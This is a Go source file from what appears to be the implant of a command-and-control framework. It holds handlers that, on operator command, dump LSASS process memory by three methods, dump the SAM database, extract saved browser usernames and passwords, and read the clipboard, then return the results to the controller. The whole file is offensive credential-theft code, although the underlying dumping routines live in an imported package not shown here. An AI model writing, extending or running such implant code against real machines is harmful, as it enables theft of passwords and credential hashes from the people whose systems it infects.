package main

import (
	"fmt"
	"os"
	"strings"

	"github.com/mjopsec/taburtuaiC2/implant/creds"
	"github.com/mjopsec/taburtuaiC2/pkg/types"
)

func handleLSASSDump(cmd *types.Command, result *types.CommandResult) {
	out := cmd.DestinationPath
	if out == "" {
		out = os.TempDir() + `\lsass.dmp`
	}
	if err := creds.DumpLSASS(out); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("[+] LSASS dump written to %s", out)
}

func handleLSASSDumpDup(cmd *types.Command, result *types.CommandResult) {
	out := cmd.DestinationPath
	if out == "" {
		out = os.TempDir() + string(os.PathSeparator) + "lsass_dup.dmp"
	}
	msg, err := creds.LsassDumpViaDup(out)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = "[+] " + msg
}

func handleLSASSDumpWER(cmd *types.Command, result *types.CommandResult) {
	out := cmd.DestinationPath
	if out == "" {
		out = os.TempDir() + string(os.PathSeparator) + "lsass_wer.dmp"
	}
	msg, err := creds.LsassDumpViaWER(out)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = "[+] " + msg
}

func handleSAMDump(cmd *types.Command, result *types.CommandResult) {
	dir := cmd.DestinationPath
	if dir == "" {
		dir = os.TempDir()
	}
	out, err := creds.DumpSAM(dir)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = out
}

func handleBrowserCreds(_ *types.Command, result *types.CommandResult) {
	all, err := creds.BrowserCredsAll()
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	if len(all) == 0 {
		result.Output = "(no credentials found)"
		return
	}
	var sb strings.Builder
	for _, c := range all {
		sb.WriteString(fmt.Sprintf("[%s] %s  user=%s  pass=%s\n", c.Browser, c.URL, c.Username, c.Password))
	}
	result.Output = sb.String()
}

func handleClipboardRead(_ *types.Command, result *types.CommandResult) {
	text, err := creds.ReadClipboard()
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	if text == "" {
		result.Output = "(clipboard empty)"
		return
	}
	result.Output = text
}
